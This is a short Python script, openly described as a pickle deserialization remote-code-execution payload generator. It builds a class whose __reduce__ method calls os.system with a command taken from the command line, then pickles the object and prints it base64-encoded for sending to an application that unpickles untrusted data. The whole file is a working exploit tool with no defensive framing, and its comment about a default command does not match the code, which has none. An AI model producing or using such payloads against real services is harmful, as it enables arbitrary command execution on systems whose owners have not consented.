#!/usr/bin/python
#
# Pickle deserialization RCE payload.
# To be invoked with command to execute at it's first parameter.
# Otherwise, the default one will be used.
#

import pickle 
import sys
import base64
import os

COMMAND = sys.argv[1]

class PickleRce(object):
    def __reduce__(self):
        return (os.system,(COMMAND,))

print (base64.b64encode(pickle.dumps(PickleRce())))
